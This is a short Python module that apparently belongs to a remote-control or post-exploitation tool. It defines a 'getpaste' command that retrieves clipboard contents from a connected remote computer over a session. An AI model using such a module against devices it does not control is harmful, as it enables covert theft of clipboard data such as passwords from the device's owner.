class command:
    def __init__(self):
        self.name = "getpaste"
        self.description = "Get Pasteboard Contents From The Remote PC!"
        self.type = "native"

    def run(self,session,cmd_data):
        print session.send_command(cmd_data)
